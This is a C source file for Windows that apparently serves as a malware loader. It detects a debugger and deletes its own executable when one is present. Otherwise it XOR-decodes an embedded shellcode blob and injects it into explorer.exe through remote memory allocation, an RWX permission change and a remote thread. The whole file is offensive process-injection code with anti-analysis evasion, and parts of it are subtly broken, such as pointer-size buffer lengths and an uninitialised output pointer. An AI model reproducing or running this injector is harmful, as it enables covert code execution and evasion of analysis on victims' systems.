#include "NT.h"

/*----------[FUNCTION]----------*/
int SelfDelete(void) {

    HANDLE hFILE = INVALID_HANDLE_VALUE;
    const wchar_t* NEWSTREAM = (const wchar_t*)NEW_STREAM;
    size_t RenameSize = sizeof(FILE_RENAME_INFO) + sizeof(NEWSTREAM);
    PFILE_RENAME_INFO PFRI = NULL;
    WCHAR PathSize[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO SetDelete = { 0 };

    //allocate buffer
    PFRI = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,RenameSize);
    if (!PFRI) {
        warn("failed to allocate, error 0x%lx", GetLastError());
        return EXIT_SUCCESS;
    }

    ZeroMemory(PathSize,sizeof(PathSize));
    ZeroMemory(&SetDelete, sizeof(FILE_DISPOSITION_INFO));

    SetDelete.DeleteFile = TRUE;

    //set new data
    PFRI->FileNameLength = sizeof(NEWSTREAM);
    RtlCopyMemory(PFRI->FileName,NEWSTREAM, sizeof(NEWSTREAM));
    info("file rename info->%S", PFRI->FileName);

    //get current file name
    if (GetModuleFileNameW(NULL, PathSize, MAX_PATH * 2) == 0) {
        warn("sus");
        return EXIT_FAILURE;
    }
    //get file handle
    hFILE = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL,OPEN_EXISTING, NULL, NULL);
    if (hFILE == INVALID_HANDLE_VALUE) {
        warn("invalid handle1");
        return EXIT_FAILURE;
    }
    info("hfile: %p\n",hFILE);
    info("filename: %p\n", FileNameInfo);
    info("pfri: %p\n", PFRI);
    info("renamesize: %p\n", RenameSize);

    //rename
    if (!SetFileInformationByHandle(hFILE,FileRenameInfo,PFRI,RenameSize)) {
        warn("failure1 0x%lx",GetLastError()); 
     }
    CloseHandle(hFILE);

    //deletion
    hFILE = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFILE == INVALID_HANDLE_VALUE) {
        warn("invalid handle2");
        return EXIT_FAILURE;
    }

    if (!SetFileInformationByHandle(hFILE, FileDispositionInfo, &SetDelete, sizeof(SetDelete))) {
        warn("failure2 0x%lx", GetLastError());
        return EXIT_FAILURE;
    }

    CloseHandle(hFILE);
    HeapFree(GetProcessHeap(), 0, PFRI);
    info("deleted");
    return EXIT_SUCCESS;
}

DWORD retrivePID (char * process_name){
    
    DWORD aProcesses[1024], cbNeeded, cProcesses;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)){     //riempio il vettore aProcesses
        return 1;
    }
    cProcesses = cbNeeded / sizeof(DWORD);      //calcolo il numero di processi ottenuti


    for (DWORD i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

            if (hProcess != NULL) {
                HMODULE hMod;
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
                }
            }

            CloseHandle(hProcess);

            if (_tcsicmp(szProcessName, process_name) == 0) {
                return aProcesses[i];
            }
        }
    }
    return -1;
}

/*----------[MAIN]----------*/
int main (int argc, char* argv[]){

    if (IsDebuggerPresent()){
        info("debugger present\n");
        SelfDelete();
        return EXIT_FAILURE;
    } 

    else {
        info("debugger not present\n");

   /*----------[VARIABLES]----------*/
    HANDLE hProcess=NULL, hThread=NULL;
    DWORD dwPID=0, dwTID=0;
    PVOID rBuffer=NULL;

    /*----------[PID]----------*/
    dwPID = retrivePID("explorer.exe");
        if (dwPID == -1){
            warn("Could not retrive PID process\n");
            return EXIT_FAILURE;
        }

    /*----------[SHELL CODE]----------*/
    unsigned char shellCode[] ="\xb7\x03\xc8\xaf\xbb\xa3\x87\x4b\x4b\x4b\x0a\x1a\x0a\x1b\x19\x03\x7a\x99\x1a\x2e\x03\xc0\x19\x2b\x03\xc0\x19\x53\x03\xc0\x19\x6b\x1d\x03\x44\xfc\x01\x01\x03\xc0\x39\x1b\x06\x7a\x82\x03\x7a\x8b\xe7\x77\x2a\x37\x49\x67\x6b\x0a\x8a\x82\x46\x0a\x4a\x8a\xa9\xa6\x19\x0a\x1a\x03\xc0\x19\x6b\xc0\x09\x77\x03\x4a\x9b\x2d\xca\x33\x53\x40\x49\x44\xce\x39\x4b\x4b\x4b\xc0\xcb\xc3\x4b\x4b\x4b\x03\xce\x8b\x3f\x2c\x03\x4a\x9b\x1b\xc0\x03\x53\x0f\xc0\x0b\x6b\x02\x4a\x9b\xa8\x1d\x03\xb4\x82\x06\x7a\x82\x0a\xc0\x7f\xc3\x03\x4a\x9d\x03\x7a\x8b\x0a\x8a\x82\x46\xe7\x0a\x4a\x8a\x73\xab\x3e\xba\x07\x48\x07\x6f\x43\x0e\x72\x9a\x3e\x93\x13\x0f\xc0\x0b\x6f\x02\x4a\x9b\x2d\x0a\xc0\x47\x03\x0f\xc0\x0b\x57\x02\x4a\x9b\x0a\xc0\x4f\xc3\x0a\x13\x0a\x13\x15\x03\x4a\x9b\x12\x11\x0a\x13\x0a\x12\x0a\x11\x03\xc8\xa7\x6b\x0a\x19\xb4\xab\x13\x0a\x12\x11\x03\xc0\x59\xa2\x00\xb4\xb4\xb4\x16\x02\xf5\x3c\x38\x79\x14\x78\x79\x4b\x4b\x0a\x1d\x02\xc2\xad\x03\xca\xa7\xeb\x4a\x4b\x4b\x02\xc2\xae\x02\xf7\x49\x4b\x4a\xf0\x8b\xe3\x4a\x44\x0a\x1f\x02\xc2\xaf\x07\xc2\xba\x0a\xf1\x07\x3c\x6d\x4c\xb4\x9e\x07\xc2\xa1\x23\x4a\x4a\x4b\x4b\x12\x0a\xf1\x62\xcb\x20\x4b\xb4\x9e\x21\x41\x0a\x15\x1b\x1b\x06\x7a\x82\x06\x7a\x8b\x03\xb4\x8b\x03\xc2\x89\x03\xb4\x8b\x03\xc2\x8a\x0a\xf1\xa1\x44\x94\xab\xb4\x9e\x03\xc2\x8c\x21\x5b\x0a\x13\x07\xc2\xa9\x03\xc2\xb2\x0a\xf1\xd2\xee\x3f\x2a\xb4\x9e\xce\x8b\x3f\x41\x02\xb4\x85\x3e\xae\xa3\xd8\x4b\x4b\x4b\x03\xc8\xa7\x5b\x03\xc2\xa9\x06\x7a\x82\x21\x4f\x0a\x13\x03\xc2\xb2\x0a\xf1\x49\x92\x83\x14\xb4\x9e\xc8\xb3\x4b\x35\x1e\x03\xc8\x8f\x6b\x15\xc2\xbd\x21\x0b\x0a\x12\x23\x4b\x5b\x4b\x4b\x0a\x13\x03\xc2\xb9\x03\x7a\x82\x0a\xf1\x13\xef\x18\xae\xb4\x9e\x03\xc2\x88\x02\xc2\x8c\x06\x7a\x82\x02\xc2\xbb\x03\xc2\x91\x03\xc2\xb2\x0a\xf1\x49\x92\x83\x14\xb4\x9e\xc8\xb3\x4b\x36\x63\x13\x0a\x1c\x12\x23\x4b\x0b\x4b\x4b\x0a\x13\x21\x4b\x11\x0a\xf1\x40\x64\x44\x7b\xb4\x9e\x1c\x12\x0a\xf1\x3e\x25\x06\x2a\xb4\x9e\x02\xb4\x85\xa2\x77\xb4\xb4\xb4\x03\x4a\x88\x03\x62\x8d\x03\xce\xbd\x3e\xff\x0a\xb4\xac\x13\x21\x4b\x12\x02\x8c\x89\xbb\xfe\xe9\x1d\xb4\x9e\x4b";
    char key = 'K';
    for (int i=0; i<sizeof(shellCode) - 2; i++){
    shellCode[i] = shellCode[i]^key;
    }
    size_t shellCodeSize= sizeof(shellCode);

    /*----------[OPEN PROCESS]----------*/
    info("Fetching handle for process with PID: %ld\n ", dwPID);

    hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID);
    if(hProcess==NULL){
        warn("Could not get handle to the process, error number [%ld]\n", GetLastError());
        return EXIT_FAILURE;
    }
    info("Got handle on process: -0x%p\n",hProcess);

    /*----------[ALLOCATE MEMORY]----------*/
    rBuffer= VirtualAllocEx(hProcess,NULL,shellCodeSize,(MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if(rBuffer==NULL){
        warn("Could not allocate buffer, error[%ld]\n",GetLastError());
        return EXIT_FAILURE;
    }
    info("Allocated %zd-bytes to the process memory\n",shellCodeSize);
    
    /*----------[CHANGE MEMORY PERMISSION]----------*/
    PDWORD lpflOldProtect;
    if(!VirtualProtectEx(hProcess,rBuffer,shellCodeSize,PAGE_EXECUTE_READWRITE,lpflOldProtect)){
        warn("Could not change permissions, error[%ld]\n",GetLastError());
        return EXIT_FAILURE;
    } 
    info("Permissions changed\n");
    
    /*----------[WRITE MEMORY]----------*/
    if(!WriteProcessMemory(hProcess,rBuffer,shellCode,shellCodeSize,NULL)){
         warn("Could not write memory, error[%ld]\n",GetLastError());
        return EXIT_FAILURE;
    }
    info("Written shellcode to the allocated process memory\n");

    /*----------[CREATE THREAD]----------*/
    hThread=CreateRemoteThreadEx(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)rBuffer,NULL,0,NULL,dwTID);
    if (hThread==NULL){
        warn("Could not execute thread\n");
        return EXIT_FAILURE;
    }
    info("Code executed\n");

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
    }
}



